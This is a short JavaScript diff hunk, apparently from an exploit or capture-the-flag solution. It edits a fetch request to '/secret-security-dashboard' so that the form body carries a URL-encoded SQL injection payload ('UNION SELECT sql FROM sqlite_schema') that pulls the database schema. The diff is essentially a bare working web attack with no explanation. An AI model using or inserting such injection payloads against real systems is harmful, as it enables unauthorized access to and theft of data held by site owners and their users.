@@ -6,7 +6,7 @@ fetch("/secret-security-dashboard")
       headers: {
         "Content-Type": "application/x-www-form-urlencoded",
       },
-      body: "id=1",
+      body: "id=1%20UNION%20SELECT%20sql%20FROM%20sqlite_schema",
     })
     .then(response => response.text())
     .then(checkResolveData => {
